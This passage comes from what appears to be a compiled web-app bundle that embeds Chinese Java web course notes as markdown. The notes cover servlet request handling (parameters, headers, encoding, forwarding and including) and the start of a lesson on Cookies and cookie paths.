System.out.println("getQueryString() is :"+queryString);\n        System.out.println("getServletPath() is :"+servletPath);\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n}\n```\n\n### 2.3.2 请求对象常用方法2-获取请求头信息\n\n```java\n/**\n * 获取请求消息头\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo2 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        //1.根据名称获取头的值\t一个消息头一个值\n        String value = request.getHeader("Accept-Encoding");\n        System.out.println("getHeader():"+value);\n\n        //2.根据名称获取头的值\t一个头多个值\n        Enumeration<String> values = request.getHeaders("Accept");\n        while(values.hasMoreElements()){\n            System.out.println("getHeaders():"+values.nextElement());\n        }\n\n        //3.获取请求消息头的名称的枚举\n        Enumeration<String> names = request.getHeaderNames();\n        while(names.hasMoreElements()){\n            String name = names.nextElement();\n            String value1 = request.getHeader(name);\n            System.out.println(name+":"+value1);\n        }\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n### 2.3.3 请求对象常用方法3-获取请求参数（非常重要）\n\n在本小节，我们会讲解HttpServletRequest对象获取请求参数的常用方法，以及把获取到的请求参数封装到实体类中的方式。首先，我们先来创建一个Servlet对象\n\n```java\n/**\n * 封装请求正文到javabean（数据模型）\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo3 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        /*\n         * 把下面\n         *\t\t1）获取请求参数\n         *\t\t2）封装请求参数到实体类中\n         * 中定义的test1到test8逐个添加到此处来运行即可。\n         */\n    }\n \n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n}\n```\n\n接下来，我们在来准备一个表单页面：\n\n```html\n<html>\n<head>\n\t<title>login to request demo 3</title>\n</head>\n<body>\n<form action="/day10_1122_requestresponse/RequestDemo3" method="post">\n\t用户名：<input type="text" name="username" /><br/>\n\t密码：<input type="password" name="password" /><br/>\n\t性别：<input type="radio" name="gender" value="1" checked>男\n\t<input type="radio" name="gender" value="0">女\n\t<br/>\n\t<input type="submit" value="注册" />\n</form>\n</body>\n</html>\n```\n\n现在，我们开始分析HttpServletRequest对象用于获取请求参数的方法：\n\n#### 1）获取请求参数\n\n**getParameter()方法的示例代码**\n\n```java\n/**\n * 获取请求正文，一个名称对应一个值。\t\t\t\t\t\t\t\t没有使用确认密码\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n */\nprivate void test1(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    //1.获取请求正文\n    String username = request.getParameter("username");\n    String password = request.getParameter("password");\n    String gender = request.getParameter("gender");\n    System.out.println(username+","+password+","+gender);\n}\n```\n\n**getParameterValues()方法的示例代码**\n\n```java\n/**\n * 获取请求正文，一个名称可能对应多个值\t\t\t\t\t\t\t\t\t使用了确认密码\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n*/\nprivate void test2(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    //1.获取请求正文\n    String username = request.getParameter("username");\n    String[] password = request.getParameterValues("password");//当表单中有多个名称是一样时，得到是一个字符串数组\n    String gender = request.getParameter("gender");\n    System.out.println(username+","+Arrays.toString(password)+","+gender);\n}\n```\n\n```html\n<html>\n<head>\n\t<title>login to request demo 4</title>\n</head>\n<body>\n<form action="/day10_1122_requestresponse/RequestDemo4" method="post" enctype="multipart/form-data">\n\t用户名：<input type="text" name="username" /><br/>\n\t密码：<input type="password" name="password" /><br/>\n\t确认密码：<input type="password" name="password" /><br/>\n\t性别：<input type="radio" name="gender" value="1" checked>男\n\t<input type="radio" name="gender" value="0">女\n\t<br/>\n\t<input type="submit" value="注册" />\n</form>\n</body>\n</html>\n```\n\n**getParameterNames()方法的示例代码**\n\n```java\n/**\n * 获取请求正文，一个名称一个值。但是先要获取正文名称的枚举（key的枚举）\t\t\t\t没有使用确认密码\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n*/\nprivate void test3(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    //1.获取请求正文名称的枚举\n    Enumeration<String> names = request.getParameterNames();\n    //2.遍历正文名称的枚举\n    while(names.hasMoreElements()){\n        String name = names.nextElement();\n        String value = request.getParameter(name);\n        System.out.println(name+":"+value);\n    }\n}\n```\n\n**总结：**\n\n​\t以上三个方法可以获取表单提交过来的请求参数。\n\n​\t参数的名称是一个字符串，参数的值可能是一个字符串，也可能是一个字符串数组。\n\n#### 2）封装请求参数到实体类中\n\n我们通过上面的方法可以获取到请求参数，但是如果参数过多，在进行传递时，方法的形参定义将会变得非常难看。此时我们应该用一个对象来描述这些参数，它就是实体类。这种类的定义，从基础阶段我们就开始使用了。在基础阶段，我们做过一个学生管理系统，用到了一个Student的类，它就是用于描述一个学生的实体类。\n\n我们现在要做的就是把表单中提交过来的数据填充到实体类中。\n\n**第一种：最简单直接的封装方式**\n\n```java\n/**\n * 封装请求正文到User对象中\t\t\t\t\t\t\t\t\t没有使用确认密码\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n */\nprivate void test4(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    //1.获取请求正文\n    String username = request.getParameter("username");\n    String password = request.getParameter("password");\n    String gender = request.getParameter("gender");\n    //2.创建一个User对象\n    User user = new User();\n    System.out.println("封装前："+user.toString());\n    //3.把请求正文封装到user对象中\n    user.setUsername(username);\n    user.setPassword(password);\n    user.setGender(gender);\n    System.out.println("封装后："+user.toString());\n}\n```\n\n**第二种：使用反射方式封装**\n\n此种封装的使用要求是，表单`<input>`标签的name属性取值，必须和实体类中定义的属性名称一致。\n\n```java\n/**\n * 封装请求正文到javabean中\t\t\t\t\t\t\t\t\t\t没有使用确认密码\n * 使用反射+内省实现数据模型的封装\n * 内省：是sun公司推出的一套简化反射操作的规范。把javabean中的元素都封装成一个属性描述器。\n * \t        属性描述器中会有字段信息，get和set方法（取值或存值）\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n*/\nprivate void test5(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    //1.获取请求正文名称的枚举\n    Enumeration<String> names = request.getParameterNames();\n    User user = new User();\n    System.out.println("封装前："+user.toString());\n    //2.遍历正文名称的枚举\n    while(names.hasMoreElements()){\n        String name = names.nextElement();\n        String value = request.getParameter(name);\n        try{\n            //1.拿到User对象中的属性描述器。是谁的属性描述器：是由构造函数的第一个参数决定的。第二个参数是指定javabean的字节码\n            PropertyDescriptor pd = new PropertyDescriptor(name, User.class);//参数指的就是拿哪个类的哪个属性的描述器\n            //2.设置javabean属性的值\n            Method method = pd.getWriteMethod();\n            //3.执行方法\n            method.invoke(user, value);//第一个参数是指的给哪个对象，第二个参数指的是赋什么值\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n    System.out.println("封装后："+user.toString());\n} \n```\n\n**第三种：使用反射封装，同时请求参数的值是一个数组**\n\n此种方式其实就是针对请求参数中包含name属性相同的参数，例如：密码和确认密码，还有爱好。\n\n```java\n/**\n * 获取请求正文的关系映射Map<String,String[]>\t\t\t\t使用确认密码\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n */\nprivate void test6(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    //1.获取请求正文的映射关系\n    Map<String,String[]> map = request.getParameterMap();\n    //2.遍历集合\n    for(Map.Entry<String,String[]> me : map.entrySet()){\n        String name = me.getKey();\n        String[] value = me.getValue();\n        System.out.println(name+":"+Arrays.toString(value));\n    }\n} \n```\n\n当我们把请求参数获取出来之后，就要考虑如何针对数组的反射了，具体代码如下：\n\n```java\n /**\n * 封装请求正文到javabean。使用的是反射+内省\t\t\t\t\t\t使用了确认密码\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n */\nprivate void test7(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    //1.获取请求正文的映射关系\n    Map<String,String[]> map = request.getParameterMap();\n    Users user = new Users();\n    System.out.println("封装前："+user.toString());\n    //2.遍历集合\n    for(Map.Entry<String,String[]> me : map.entrySet()){\n        String name = me.getKey();\n        String[] value = me.getValue();\n        try{\n            //1.拿到User对象中的属性描述器。是谁的属性描述器：是由构造函数的第一个参数决定的。第二个参数是指定javabean的字节码\n            PropertyDescriptor pd = new PropertyDescriptor(name, Users.class);//参数指的就是拿哪个类的哪个属性的描述器\n            //2.设置javabean属性的值\n            Method method = pd.getWriteMethod();\n            //3.执行方法\n            //判断参数到底是几个值\n            if(value.length > 1){//最少有2个元素\n                method.invoke(user, (Object)value);//第一个参数是指的给哪个对象，第二个参数指的是赋什么值\n            }else{\n                method.invoke(user, value);//第一个参数是指的给哪个对象，第二个参数指的是赋什么值\n            }\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n    System.out.println("封装后："+user.toString());\n}\n```\n\n当我们写完此种封装方式之后，同学们可以发现，我们绝大多数封装都可以使用这段代码来实现。并且，无论是谁来写这段通用的封装代码，其代码内容都是大同小异的。**那么，我们就可以得出一个很有趣的结论：一般遇到这种情况时，肯定有人帮我们写好了，我们只需要用就行了。**我们后面还会遇到类似这样的情况。\n\n此时，帮我们写好这段封装代码的是apache软件基金会，我们前面学习的tomcat也是它提供的。它里面有一个开源工具包集合commons，里面有很多开源工具类，今天我们就来讲解第一个：<font color=\'red\'><b>commons-beanutils</b></font>。\n\n**第四种：使用apache的commons-beanutils实现封装**\n\n实现代码：\n\n```java\n/**\n * 终极方法：使用beanutils实现请求正文封装到javabean中\t\t\t\t使用了确认密码\n * 要想使用beanutils，需要先导包\n * @param request\n * @param response\n * @throws ServletException\n * @throws IOException\n */\nprivate void test8(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    Users user = new Users();\n    System.out.println("封装前："+user.toString());\n    try{\n        BeanUtils.populate(user, request.getParameterMap());//就这一句话\n    }catch(Exception e){\n        e.printStackTrace();\n    }\n    System.out.println("封装后："+user.toString());\n}\n```\n\n### 2.3.4 用流的形式读取请求信息\n\n我们除了使用2.3.3小节中获取请求参数之外，还可以使用下面代码中的 方式来获取：\n\n```java\n/**\n * 使用流的方式读取请求正文\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo4 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        //1.获取请求正文的字节输入流\n        ServletInputStream sis = request.getInputStream();\n        //2.读取流中的数据\n        int len = 0;\n        byte[] by = new byte[1024];\n        while((len = sis.read(by)) != -1){\n            System.out.println(new String(by,0,len));\n        }\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n### 2.3.5请求正文中中文编码问题\n\n关于请求中文乱码问题，我们需要分开讨论，第一是POST请求方式，第二是GET方式。\n\n#### 1）POST方式请求\n\n在POST方式请求中，我们的乱码问题可以用如下代码解决：\n\n```java\n/**\n * 请求正文的中文乱码问题\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo5 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        //1.获取请求正文\n\t\t/*POST方式：\n\t\t * 问题：\n\t\t * \t取的时候会不会有乱码\n\t\t * 答案：\n\t\t * \t获取请求正文，会有乱码问题。\n\t\t * \t是在获取的时候就已经乱码了。\n\t\t * 解决办法：\n\t\t * \t 是request对象的编码出问题了\n\t\t *   设置request对象的字符集\n\t\t *   request.setCharacterEncoding("GBK");它只能解决POST的请求方式，GET方式解决不了\n\t\t * 结论：\n\t\t * \t 请求正文的字符集和响应正文的字符集没有关系。各是各的\n\t\t */\n\t\trequest.setCharacterEncoding("UTF-8");\n\t\tString username = request.getParameter("username");\n        //输出到控制台\n\t\tSystem.out.println(username);\n        //输出到浏览器：注意响应的乱码问题已经解决了\n        response.setContentType("text/html;charset=UTF-8");\n        PrintWriter out = response.getWriter();\n        out.write(username);\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n}\n```\n\n#### 2）GET方式请求\n\nGET方式请求的正文是在地址栏中，在Tomcat8.5版本及以后，Tomcat服务器已经帮我们解决了，所以不会有乱码问题了。\n\n而如果我们使用的不是Tomcat服务器，或者Tomcat的版本是8.5以前，那么GET方式仍然会有乱码问题，解决方式如下：（以下代码了解即可，因为我们现在使用的是Tomcat9.0.27版本）\n\n```java\n/**\n * 在Servlet的doGet方法中添加如下代码\n */\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n   \n\n        /*\n         * GET方式：正文在地址栏\n         * username=%D5%C5%C8%FD\n         * %D5%C5%C8%FD是已经被编过一次码了\n         *\n         * 解决办法：\n         * \t 使用正确的码表对已经编过码的数据进行解码。\n         * \t\t就是把取出的内容转成一个字节数组，但是要使用正确的码表。（ISO-8859-1）\n         * \t 再使用正确的码表进行编码\n         * \t\t把字节数组再转成一个字符串，需要使用正确的码表，是看浏览器当时用的是什么码表\n         */\n        String username = request.getParameter("username");\n        byte[] by = username.getBytes("ISO-8859-1");\n        username = new String(by,"GBK");\n\n        //输出到浏览器：注意响应的乱码问题已经解决了\n        response.setContentType("text/html;charset=UTF-8");\n        PrintWriter out = response.getWriter();\n        out.write(username);\n}\n\npublic void doPost(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    doGet(request, response);\n}\n```\n\n### 2.3.6 请求转发（与重定向的区别）\n\n在实际开发中，重定向和请求转发都是我们要用到的响应方式，那么他们有什么区别呢？我们通过下面的示例来看一下：\n\n```java\n/**\n * 重定向特点：\n * \t两次请求，浏览器行为，地址栏改变，请求域中的数据会丢失\n * 请求转发：\n * \t一次请求，服务器行为，地址栏不变，请求域中的数据不丢失\n *\n * 请求域的作用范围：\n * \t 当前请求（一次请求）,和当前请求的转发之中\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo6 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        //1.拿到请求调度对象\n        RequestDispatcher rd = request.getRequestDispatcher("/RequestDemo7");//如果是给浏览器看的，/可写可不写。如果是给服务器看的，一般情况下，/都是必须的。\n        //放入数据到请求域中\n        request.setAttribute("CityCode", "bj-010");\n        //2.实现真正的转发操作\n        rd.forward(request, response);//实现真正的转发操作\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n```java\n/**\n * 转发的目的地\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo7 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        //获取请求域中的数据\n        String value = (String)request.getAttribute("CityCode");\n        response.getWriter().write("welcome to request demo 7    "+value);\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n### 2.3.7 请求包含\n\n在实际开发中，我们可能需要把两个Servlet的内容合并到一起来响应浏览器，而同学们都知道HTTP协议的特点是一请求，一响应的方式。所以绝对不可能出现有两个Servlet同时响应方式。那么我们就需要用到请求包含，把两个Servlet的响应内容合并输出。我们看具体使用示例：\n\n```java\n/**\n * 请求包含\n *\n * 它是把两个Servlet的响应内容合并输出。\n * 注意：\n * \t这种包含是动态包含。\n *\n * 动态包含的特点：\n * \t\t各编译各的，只是最后合并输出。\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo8 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        response.getWriter().write("I am request demo8 ");\n        //1.拿到请求调度对象\n        RequestDispatcher rd = request.getRequestDispatcher("/RequestDemo9");\n        //2.实现包含的操作\n        rd.include(request, response);\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n}\n```\n\n```java\n/**\n * 被包含者\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo9 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        response.getWriter().write("include request demo 9 ");\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n### 2.3.8 细节问题\n\n请求转发的注意事项：负责转发的Servlet，转发前后的响应正文丢失，由转发目的地来响应浏览器。\n\n请求包含的注意事项：被包含者的响应消息头丢失。因为它被包含起来了。\n\n# 3 案例中的使用\n\n## 3.1 案例的需求及环境\n\n### 3.1.1 案例需求介绍\n\n在昨天的课程中，我们实现了浏览器发送请求，由Servlet来接收。今天，我们继续对学生管理系统进行升级，通过Servlet来实现学生的新增，删除，修改，查询操作。\n\n新增：Create\n\n查询：Read\n\n修改：Update\n\n删除：Delete\n\n每个单词取第一个字母，组成了CRUD。所以，同学们今后看到CRUD操作，指的就是增删改查。\n\n今天案例的CRUD，我们只关注Servlet接收请求和处理响应，不用过多的去关注真正增删改查操作（因为，我们目前还是把学生信息写到文件中，等web5天课程结束，我们会讲解数据库，它是我们保存数据这类问题的终极解决方案，而保存文件只是个替代品，我们没必要在替代品处消耗太多精力）。\n\n',Jr={data:function(){return{MainComponent:Ur}}},zr=Jr,Wr=Object(u["a"])(zr,Br,Fr,!1,null,"19d0f2b6",null),$r=Wr.exports,Gr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Vr=[],Qr='# Cookie&SessionJsp-授课\n\n# 1 会话技术\n\n## 1.1 会话管理概述\n\n### 1.1.1 什么是会话\n\n这里的会话，指的是web开发中的一次通话过程，当打开浏览器，访问网站地址后，会话开始，当关闭浏览器（或者到了过期时间），会话结束。\n\n举个例子：\n\n​\t例如，你在给家人打电话，这时突然有送快递的配送员敲门，你放下电话去开门，收完快递回来后，通话还在保持中，继续说话就行了。\n\n### 1.1.2 会话管理作用\n\n什么时候会用到会话管理呢？最常见的就是购物车，当我们登录成功后，把商品加入到购物车之中，此时我们无论再浏览什么商品，当点击购物车时，那些加入的商品都仍在购物车中。\n\n在我们的实际开发中，还有很多地方都离不开会话管理技术。比如，我们在论坛发帖，没有登录的游客身份是不允许发帖的。所以当我们登录成功后，无论我们进入哪个版块发帖，只要权限允许的情况下，服务器都会认识我们，从而让我们发帖，因为登录成功的信息一直保留在服务器端的会话中。\n\n通过上面的两个例子，我们可以看出，它是为我们共享数据用的，并且是在不同请求间实现数据共享。也就是说，如果我们需要在多次请求间实现数据共享，就可以考虑使用会话管理技术了。\n\n### 1.1.3 会话管理分类\n\n在JavaEE的项目中，会话管理分为两类。分别是：客户端会话管理技术和服务端会话管理技术。\n\n**客户端会话管理技术**\n\n​\t\t它是把要共享的数据保存到了客户端（也就是浏览器端）。每次请求时，把会话信息带到服务器，从而实现多次请求的数据共享。\n\n**服务端会话管理技术**\n\n​\t\t它本质仍是采用客户端会话管理技术，只不过保存到客户端的是一个特殊的标识，并且把要共享的数据保存到了服务端的内存对象中。每次请求时，把这个标识带到服务器端，然后使用这个标识，找到对应的内存空间，从而实现数据共享。\n\n## 1.2 客户端会话管理技术\n\n### 1.2.1 Cookie概述\n\n#### 1）什么是Cookie\n\n它是客户端浏览器的缓存文件，里面记录了客户浏览器访问网站的一些内容。同时，也是HTTP协议请求和响应消息头的一部分（在HTTP协议课程中，我们备注了它很重要）。\n\n#### 2）Cookie的API详解\n\n**作用**\n\n它可以保存客户浏览器访问网站的相关内容（需要客户端不禁用Cookie）。从而在每次访问需要同一个内容时，先从本地缓存获取，使资源共享，提高效率。\n\n**Cookie的属性**\n\n| 属性名称 | 属性作用                 | 是否重要 |\n| -------- | ------------------------ | -------- |\n| name     | cookie的名称             | 必要属性 |\n| value    | cookie的值（不能是中文） | 必要属性 |\n| path     | cookie的路径             | 重要     |\n| domain   | cookie的域名             | 重要     |\n| maxAge   | cookie的生存时间。       | 重要     |\n| version  | cookie的版本号。         | 不重要   |\n| comment  | cookie的说明。           | 不重要   |\n\n**细节**\n\nCookie有大小，个数限制。每个网站最多只能存20个cookie，且大小不能超过4kb。同时，所有网站的cookie总数不超过300个。\n\n当删除Cookie时，设置maxAge值为0。当不设置maxAge时，使用的是浏览器的内存，当关闭浏览器之后，cookie将丢失。设置了此值，就会保存成缓存文件（值必须是大于0的,以秒为单位）。\n\n#### 3）Cookie涉及的常用方法\n\n**创建Cookie**\n\n![Cookie的方法](./img/java/javaweb/Cookie&SessionJsp-授课.assets/Cookie的方法.png)\n\n```java\n/**\n * 通过指定的名称和值构造一个Cookie\n *\n * Cookie的名称必须遵循RFC 2109规范。这就意味着，它只能包含ASCII字母数字字符，\n * 不能包含逗号、分号或空格或以$字符开头。\n * 创建后无法更改cookie的名称。\n *\n * 该值可以是服务器选择发送的任何内容。\n * 它的价值可能只有服务器才感兴趣。\n * 创建之后，可以使用setValue方法更改cookie的值。\n */\npublic Cookie(String name, String value) {\n\tvalidation.validate(name);\n\tthis.name = name;\n\tthis.value = value;\n}\n```\n\n**向浏览器添加Cookie**\n\n![添加Cookie的方法](./img/java/javaweb/Cookie&SessionJsp-授课.assets/添加Cookie的方法.png)\n\n```java\n/**\n * 添加Cookie到响应中。此方法可以多次调用，用以添加多个Cookie。\n */\npublic void addCookie(Cookie cookie);\n```\n\n**从服务器端获取Cookie**\n\n![获取Cookie的方法](./img/java/javaweb/Cookie&SessionJsp-授课.assets/获取Cookie的方法.png)\n\n```java\n/**\n * 这是HttpServletRequest中的方法。\n * 它返回一个Cookie的数组，包含客户端随此请求发送的所有Cookie对象。\n * 如果没有符合规则的cookie，则此方法返回null。\n */\n public Cookie[] getCookies();\n```\n\n### 1.2.2 Cookie的Path细节：浏览器什么时候带给服务器，什么时候不带\n\n#### 1）需求说明\n\n创建一个Cookie，设置Cookie的path，通过不同的路径访问，从而查看请求携带Cookie的情况。\n\n#### 2）案例目的\n\n通过此案例的讲解，同学们可以清晰的描述出，客户浏览器何时带cookie到服务器端，何时不带。\n\n#### 3）案例步骤\n\n**第一步：创建JavaWeb工程**\n\n沿用第一个案例中的工程即可。\n\n**第二步：编写Servlet**\n\n```JAVA\n/**\n * Cookie的路径问题\n * 前期准备：\n * \t1.在demo1中写一个cookie到客户端\n *  2.在demo2和demo3中分别去获取cookie\n *  \tdemo1的Servlet映射是   /servlet/PathQuestionDemo1\n *  \tdemo2的Servlet映射是   /servlet/PathQuestionDemo2\n *  \tdemo3的Servlet映射是   /PathQuestionDemo3\n *\n * @author 黑马程序员\n * @Company http://www.itheima.com\n *\n */\npublic class PathQuestionDemo1 extends HttpServlet {\n\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\t//1.创建一个Cookie\n\t\tCookie cookie = new Cookie("pathquestion","CookiePathQuestion");\n\t\t//2.设置cookie的最大存活时间\n\t\tcookie.setMaxAge(Integer.MAX_VALUE);\n\t\t//3.把cookie发送到客户端\n\t\tresponse.addCookie(cookie);//setHeader("Set-Cookie","cookie的值")\n\t}\n\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\tdoGet(request, response);\n\t}\n}\n\n```\n\n```java\n/**\n * 获取Cookie，名称是pathquestion\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class PathQuestionDemo2 extends HttpServlet {\n\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\t//1.获取所有的cookie\n\t\tCookie[] cs = request.getCookies();\n\t\t//2.遍历cookie的数组\n\t\tfor(int i=0;cs!=null && i<cs.length;i++){\n\t\t\tif("pathquestion".equals(cs[i].getName())){\n\t\t\t\t//找到了我们想要的cookie，输出cookie的值\n\t\t\t\tresponse.getWriter().write(cs[i].getValue());\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\tdoGet(request, response);\n\t}\n}\n```\n\n```java\n/**\n * 获取Cookie，名称是pathquestion\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class PathQuestionDemo3 extends HttpServlet {\n\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\t//1.获取所有的cookie\n\t\tCookie[] cs = request.getCookies();\n\t\t//2.遍历cookie的数组\n\t\tfor(int i=0;cs!=null && i<cs.length;i++){\n\t\t\tif("pathquestion".equals(cs[i].getName())){\n\t\t\t\t//找到了我们想要的cookie，输出cookie的值\n\t\t\t\tresponse.getWriter().write(cs[i].getValue());\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\tdoGet(request, response);\n\t}\n}\n```\n\n**第三步：配置Servlet**\n\n```xml\n\x3c!--配置Cookie路径问题案例的Servlet--\x3e\n<servlet>\n    <servlet-name>PathQuestionDemo1</servlet-name>\n    <servlet-class>com.itheima.web.servlet.pathquestion.PathQuestionDemo1</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>PathQuestionDemo1</servlet-name>\n    <url-pattern>/servlet/PathQuestionDemo1</url-pattern>\n</servlet-mapping>\n\n<servlet>\n    <servlet-name>PathQuestionDemo2</servlet-name>\n    <servlet-class>com.itheima.web.servlet.pathquestion.PathQuestionDemo2</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>PathQuestionDemo2</servlet-name>\n    <url-pattern>/servlet/PathQuestionDemo2</url-pattern>\n</servlet-mapping>\n\n<servlet>\n    <servlet-name>PathQuestionDemo3</servlet-name>\n    <servlet-class>com.itheima.web.servlet.pathquestion.PathQuestionDemo3</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>PathQuestionDemo3</servlet-name>\n    <url-pattern>/PathQuestionDemo3</url-pattern>\n</servlet-mapping>\n```\n\n**第四步：部署工程**\n\n沿用第一个案例中的工程部署即可。\n\n#### 4）测试结果\n\n通过分别运行PathQuestionDemo1，2和3这3个Servlet，我们发现由demo1写Cookie，在demo2中可以取到，但是到了demo3中就无法获取了，如下图所示：\n\n![案例2-1](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例2-1.png)\n\n![案例2-2](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例2-2.png)\n\n![案例2-3](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例2-3.png)\n\n#### 5）路径问题的分析及总结\n\n**问题：**\n \t demo2和demo3谁能取到cookie？\n **答案：**\n \t demo2能取到，demo3取不到\n**分析：**\n \t 首先，我们要知道如何确定一个cookie？\n \t 那就是使用cookie的三个属性组合：<font color=\'red\'><b>domain+path+name</b></font>\n \t 这里面，同一个应用的domain是一样的，在我们的案例中都是localhost。\n​      并且，我们取的都是同一个cookie，所以name也是一样的，都是pathquestion。\n​      那么，不一样的只能是path了。但是我们没有设置过cookie的path属性，这就表明path是有默认值的。\n \t 接下来，我们打开这个cookie来看一看，在ie浏览器访问一次PathQuestionDemo1这个Servlet：\n\nCookie中的内容：\n \t\t ![Cookie文件介绍](./img/java/javaweb/Cookie&SessionJsp-授课.assets/Cookie文件介绍.png)\n 我们是通过demo1写的cookie，demo1的访问路径是： http://localhost:9090/servlet/PathQuestionDemo1\n 通过比较两个路径：请求资源地址和cookie的path，可以看出：cookie的path默认值是：请求资源URI，没有资源的部分（在我们的案例中，就是没有PathQuestionDemo1）。\n\n**客户端什么时候带cookie到服务器，什么时候不带？**\n​\t就是看请求资源URI和cookie的path比较。\n\n​\t<font color=\'red\'>请求资源URI.startWith(cookie的path) </font> 如果返回的是true就带，如果返回的是false就不带。\n\n​\t简单的说： 就是看谁的地址更精细\n\n​\t比如：Cookie的path：       /国家\t\t\t/省份\t\t\t/城市\n\n \t\t \t 请求资源URI\t:   \t  /国家\t\t\t/省份\t\t\t\t\t\t\t\t\t\t\t\t\t\t  不带\n \t\t \t 请求资源URI   ：\t   /国家\t\t\t/省份\t\t\t/城市\t\t\t/区县\t\t\t\t带\n\n![案例2-4](./img/java/javaweb/Cookie&SessionJsp-授课.assets/案例2-4.png)\n\n在我们的案例中：\n\n| 访问URL                                                      | URI部分                    | Cookie的Path | 是否携带Cookie | 能否取到Cookie |\n| ------------------------------------------------------------ | -------------------------- | ------------ | -------------- | -------------- |\n| [PathQuestionDemo2](http://localhost:9090/servlet/PathQuestionDemo2) | /servlet/PathQuestionDemo2 | /servlet/    | 带             | 能取到         |\n| [PathQuestionDemo3](http://localhost:9090/PathQuestionDemo3) | /PathQuestionDemo3         | /servlet/    | 不带           | 不能取到       |\n\n## 1.3 服务端会话管理概述\n\n### 1.3.1 HttpSession概述\n\n#### 